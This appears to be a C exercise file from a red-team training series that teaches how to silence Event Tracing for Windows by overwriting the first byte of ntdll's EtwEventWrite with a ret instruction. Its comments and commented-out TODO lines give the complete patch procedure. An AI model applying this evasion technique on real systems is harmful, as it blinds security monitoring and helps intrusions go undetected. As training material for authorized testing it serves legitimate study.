// CFarer - Red Team Exercise 07
// TOPIC: ETW Bypass - Patching EtwEventWrite
// DIFFICULTY: Advanced  PLATFORM: Windows
// PURPOSE: Authorized penetration testing education - defense evasion
//
// ETW (Event Tracing for Windows) is the kernel telemetry infrastructure.
// PowerShell Script Block Logging, .NET CLR events, and many EDR sensors
// consume ETW events to detect malicious activity.
//
// EtwEventWrite() in ntdll.dll is called for every user-mode ETW event.
// Patching it to ret immediately silences all user-mode ETW telemetry from
// the current process.
//
// Patch (same technique as AMSI bypass):
//   Original: 4C 8B DC ...    (mov r11, rsp - function prologue)
//   Patched:  C3               (ret - immediate return, no event written)
//
// NOTE: Kernel ETW providers cannot be patched from user mode.
//       This silences user-mode telemetry only.
//
// Task:
//   1. GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite")
//   2. Print first 8 bytes (before patch).
//   3. VirtualProtect to RWX.
//   4. Write 0xC3 (ret) at byte 0.
//   5. Restore protection.
//   6. Print first 8 bytes (after patch).
//   7. Verify: call EtwEventWrite - should silently return without event.

#include <windows.h>
#include <stdio.h>

typedef ULONG (NTAPI *EtwEventWrite_t)(HANDLE, PVOID, ULONG, PVOID);

static void print_bytes(const char *lbl, const BYTE *p, int n) {
    printf("%-22s ", lbl);
    for (int i = 0; i < n; i++) printf("%02X ", p[i]);
    printf("\n");
}

int main(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    // TODO 1: GetProcAddress(ntdll, "EtwEventWrite")
    BYTE *fn = NULL; // replace
    if (!fn) { fprintf(stderr, "EtwEventWrite not found\n"); return 1; }
    printf("EtwEventWrite: %p\n", (void*)fn);

    print_bytes("before patch:", fn, 8);

    // TODO 2: VirtualProtect(fn, 1, PAGE_EXECUTE_READWRITE, &old)
    DWORD old = 0;
    // VirtualProtect(fn, 1, PAGE_EXECUTE_READWRITE, &old);

    // TODO 3: *fn = 0xC3  (single ret byte)
    // *fn = 0xC3;

    // TODO 4: VirtualProtect(fn, 1, old, &old)
    // VirtualProtect(fn, 1, old, &old);

    print_bytes("after patch: ", fn, 8);
    printf("ETW silenced in this process\n");

    return 0;
}

// I AM NOT DONE
